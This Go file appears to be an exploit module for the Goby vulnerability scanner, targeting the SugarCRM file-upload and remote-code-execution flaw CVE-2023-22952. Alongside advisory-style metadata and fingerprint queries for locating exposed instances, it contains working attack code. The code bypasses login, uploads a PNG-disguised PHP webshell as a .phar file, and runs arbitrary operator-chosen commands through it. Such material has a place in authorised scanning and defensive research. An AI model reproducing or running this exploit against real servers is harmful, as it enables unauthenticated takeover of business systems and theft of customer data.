package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "SugarCRM index.php File Upload Vulnerability (CVE-2023-22952)",
    "Description": "<p>SugarCRM is a set of open source customer relationship management system (CRM) of American SugarCRM company. The system supports differentiated marketing, management and distribution of sales leads for different customer needs, and realizes information sharing and tracking of sales representatives.</p><p>SugarCRM has a security vulnerability. The vulnerability stems from an authorization bypass and PHP local file inclusion vulnerability in the installation component, which allows unauthenticated remote code execution on the configured SugarCRM instance through HTTP requests.</p>",
    "Product": "sugarcrm",
    "Homepage": "http://www.sugarcrm.com/",
    "DisclosureDate": "2023-01-04",
    "Author": "corp0ra1",
    "FofaQuery": "body=\"<a href=\\\" javascript:void window.open('http://support.sugarcrm.com')\\\">Support</a>\" || body=\"<img style='margin-top: 2px' border='0' width='106' height='23' src='include/images/poweredby_sugarcrm.png' alt='Powered By SugarCRM'>\" || body=\"<script>var module_sugar_grp1 = 'Users';</script><script>var action_sugar_grp1 = 'Login';</script><script>jscal_today\" || header=\"index.php?action=Login&module=Users\" || title=\"SugarCRM\" || body=\"var parentIsSugar = false;\" || body=\"<div id=\\\"sugarcrm\\\">\" || header=\"Set-Cookie: sugar_user_theme=Sugar5\"",
    "GobyQuery": "body=\"<a href=\\\" javascript:void window.open('http://support.sugarcrm.com')\\\">Support</a>\" || body=\"<img style='margin-top: 2px' border='0' width='106' height='23' src='include/images/poweredby_sugarcrm.png' alt='Powered By SugarCRM'>\" || body=\"<script>var module_sugar_grp1 = 'Users';</script><script>var action_sugar_grp1 = 'Login';</script><script>jscal_today\" || header=\"index.php?action=Login&module=Users\" || title=\"SugarCRM\" || body=\"var parentIsSugar = false;\" || body=\"<div id=\\\"sugarcrm\\\">\" || header=\"Set-Cookie: sugar_user_theme=Sugar5\"",
    "Level": "3",
    "Impact": "<p>SugarCRM has a security vulnerability. The vulnerability stems from an authorization bypass and PHP local file inclusion vulnerability in the installation component, which allows unauthenticated remote code execution on the configured SugarCRM instance through HTTP requests.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://support.sugarcrm.com/Resources/Security/sugarcrm-sa-2020-043/\">https://support.sugarcrm.com/Resources/Security/sugarcrm-sa-2020-043/</a></p>",
    "References": [
        "https://packetstormsecurity.com/files/170346/SugarCRM-Shell-Upload.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        "CVE-2023-22952"
    ],
    "CNNVD": [
        "CNNVD-202301-834"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "SugarCRM index.php 任意文件上传漏洞（CVE-2023-22952）",
            "Product": "sugarcrm",
            "Description": "<p>SugarCRM是美国SugarCRM公司的一套开源的客户关系管理系统（CRM）。该系统支持对不同的客户需求进行差异化营销、管理和分配销售线索，实现销售代表的信息共享和追踪。<br></p><p>SugarCRM 存在安全漏洞，该漏洞源于安装组件中存在授权绕过和PHP本地文件包含漏洞，允许通过HTTP请求对已配置的SugarCRM实例执行未经身份验证的远程代码。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://support.sugarcrm.com/Resources/Security/sugarcrm-sa-2020-043/\">https://support.sugarcrm.com/Resources/Security/sugarcrm-sa-2020-043/</a><br></p>",
            "Impact": "<p>SugarCRM 存在安全漏洞，该漏洞源于安装组件中存在授权绕过和PHP本地文件包含漏洞，允许通过HTTP请求对已配置的SugarCRM实例执行未经身份验证的远程代码。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "SugarCRM index.php File Upload Vulnerability (CVE-2023-22952)",
            "Product": "sugarcrm",
            "Description": "<p>SugarCRM is a set of open source customer relationship management system (CRM) of American SugarCRM company. The system supports differentiated marketing, management and distribution of sales leads for different customer needs, and realizes information sharing and tracking of sales representatives.<br></p><p>SugarCRM has a security vulnerability. The vulnerability stems from an authorization bypass and PHP local file inclusion vulnerability in the installation component, which allows unauthenticated remote code execution on the configured SugarCRM instance through HTTP requests.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://support.sugarcrm.com/Resources/Security/sugarcrm-sa-2020-043/\">https://support.sugarcrm.com/Resources/Security/sugarcrm-sa-2020-043/</a><br></p>",
            "Impact": "<p>SugarCRM has a security vulnerability. The vulnerability stems from an authorization bypass and PHP local file inclusion vulnerability in the installation component, which allows unauthenticated remote code execution on the configured SugarCRM instance through HTTP requests.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10710"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			uri := "/index.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = "module=Users&action=Authenticate&user_name=1&user_password=1"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				webshell, _ := base64.StdEncoding.DecodeString("iVBORw0KGgoAAAANSUhEUgAAABkAAAAUCAMAAABPqWaPAAAAS1BMVEU8P3BocCBlY2hvICIjIyMjIyI7IHBhc3N0aHJ1KGJhc2U2NF9kZWNvZGUoJF9QT1NUWyJjIl0pKTsgZWNobyAiIyMjIyMiOyA/PiD2GHg3AAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAKklEQVQokWNgwA0YmZhZWNnYOTi5uHl4+fgFBIWERUTFxCXwaBkFQxQAADC+AS1MHloSAAAAAElFTkSuQmCC")
				randName := strings.ToLower(goutils.RandomHexString(5))
				uri2 := "/index.php"
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("Cookie", resp.Cookie)
				cfg2.Header.Store("Content-Type", "multipart/form-data; boundary=73e4fcb8063f1adbcb747dc20f0e2e82")
				cfg2.Data = fmt.Sprintf("--73e4fcb8063f1adbcb747dc20f0e2e82\r\nContent-Disposition: form-data; name=\"module\"\r\n\r\nEmailTemplates\r\n--73e4fcb8063f1adbcb747dc20f0e2e82\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nAttachFiles\r\n--73e4fcb8063f1adbcb747dc20f0e2e82\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s.phar\"\r\nContent-Type: image/png\r\n\r\n%s\r\n--73e4fcb8063f1adbcb747dc20f0e2e82--\r\n", randName, webshell)
				if _, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					uri3 := fmt.Sprintf("/cache/images/%s.phar", randName)
					cfg3 := httpclient.NewPostRequestConfig(uri3)
					cfg3.VerifyTls = false
					cfg3.FollowRedirect = false
					cfg3.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfg3.Data = "c=aWQ%3D"
					if resp3, err := httpclient.DoHttpRequest(u, cfg3); err == nil {
						return strings.Contains(resp3.RawBody, "#####") && strings.Contains(resp3.RawBody, "uid=")
					}

				}

			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/index.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Cookie", "PHPSESSID=7665b859-ea78-4240-b2c2-63c890a422cd")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = "module=Users&action=Authenticate&user_name=1&user_password=1"
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				webshell, _ := base64.StdEncoding.DecodeString("iVBORw0KGgoAAAANSUhEUgAAABkAAAAUCAMAAABPqWaPAAAAS1BMVEU8P3BocCBlY2hvICIjIyMjIyI7IHBhc3N0aHJ1KGJhc2U2NF9kZWNvZGUoJF9QT1NUWyJjIl0pKTsgZWNobyAiIyMjIyMiOyA/PiD2GHg3AAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAKklEQVQokWNgwA0YmZhZWNnYOTi5uHl4+fgFBIWERUTFxCXwaBkFQxQAADC+AS1MHloSAAAAAElFTkSuQmCC")
				randName := goutils.RandomHexString(5)
				uri2 := "/index.php"
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("Cookie", "PHPSESSID=7665b859-ea78-4240-b2c2-63c890a422cd")
				cfg2.Header.Store("Content-Type", "multipart/form-data; boundary=73e4fcb8063f1adbcb747dc20f0e2e82")
				cfg2.Data = fmt.Sprintf("--73e4fcb8063f1adbcb747dc20f0e2e82\r\nContent-Disposition: form-data; name=\"module\"\r\n\r\nEmailTemplates\r\n--73e4fcb8063f1adbcb747dc20f0e2e82\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nAttachFiles\r\n--73e4fcb8063f1adbcb747dc20f0e2e82\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s.phar\"\r\nContent-Type: image/png\r\n\r\n%s\r\n--73e4fcb8063f1adbcb747dc20f0e2e82--\r\n", randName, webshell)
				if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
					uri3 := fmt.Sprintf("/cache/images/%s.phar", randName)
					cfg3 := httpclient.NewPostRequestConfig(uri3)
					cfg3.VerifyTls = false
					cfg3.FollowRedirect = false
					cfg3.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfg3.Data = "c=" + base64.StdEncoding.EncodeToString([]byte(cmd))
					if resp3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil && strings.Contains(resp3.RawBody, "#####") {
						expResult.Output = resp3.RawBody
						expResult.Success = true
					}

				}

			}
			return expResult
		},
	))
}
